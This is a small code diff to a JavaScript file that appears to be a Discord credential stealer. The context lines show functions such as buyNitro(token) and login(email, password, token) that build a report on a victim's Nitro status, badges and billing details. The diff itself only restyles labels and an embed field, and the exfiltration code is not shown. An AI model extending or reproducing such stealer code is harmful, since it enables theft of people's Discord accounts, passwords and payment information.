@@ -567,13 +567,13 @@ const buyNitro = async (token) => {
 const getNitro = (flags) => {
   switch (flags) {
     case 0:
-      return 'No Nitro';
+      return '\`No Nitro\`';
     case 1:
       return 'Nitro Classic';
     case 2:
       return 'Nitro Boost';
     default:
-      return 'No Nitro';
+      return '\`No Nitro\`';
   }
 };
 
@@ -611,10 +611,10 @@ const getBadges = (flags) => {
       badges += 'HypeSquad Balance, ';
       break;
     case 0:
-      badges = 'None';
+      badges = '\`No Badges\`';
       break;
     default:
-      badges = 'None';
+      badges = '\`No Badges\`';
       break;
   }
   return badges;
@@ -685,9 +685,9 @@ const login = async (email, password, token) => {
             inline: true,
           },
           {
-            name: '**Discord Info**',
-            value: `Billing: **${billing}**`,
-            inline: false,
+            name: '<a:6132lightblueheartspin:985668720422682724> @SN - Billing:',
+            value: `${billing}`,
+            inline: true,
           },
         ],
         author: {
